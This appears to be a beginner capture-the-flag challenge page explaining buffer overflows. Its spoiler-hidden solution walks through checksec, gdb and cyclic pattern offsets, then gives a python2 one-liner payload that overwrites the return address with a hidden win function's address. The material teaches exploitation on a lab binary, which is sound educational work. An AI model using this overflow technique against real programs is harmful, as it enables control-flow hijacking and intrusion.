<h2>Description</h2>
<p>Buffers are memory storage regions that temporarily hold data while it is being transferred from one location to another. A buffer overflow occurs when the volume of data exceeds the storage capacity of the memory buffer. As a result, the program attempting to write the data to the buffer overwrites adjacent memory locations.</p>

<h2>Goal</h2>
<p>Successfully display what is in the win function, normally inaccessible.</p>

<h2>Solution</h2>
<details>
    <summary>Spoilers! (click to expand)</summary>
    <p>* Check the security of the binary with checksec --file binary1</p>
    <p>* Try to overflow the buffer of binary1</p>
    <p>* Debug with gdb</p>
    <p>* Cyclic 100 in binary input</p>
    <p>* Binary crash with EIP 'haaa' (register for next instruction to execute)</p>
    <p>* Cyclic -l haaa --> 28</p>
    <p>* So we send 28 characters before sending the address of our hidden function</p>
    <p>* Info functions (in gdb) to get the address of the win function (0x080491d6)</p>
    <p>* python2 -c 'print "A" * 28 + "\xd6\x91\x04\x08"' [PAYLOAD]</p>
</details>
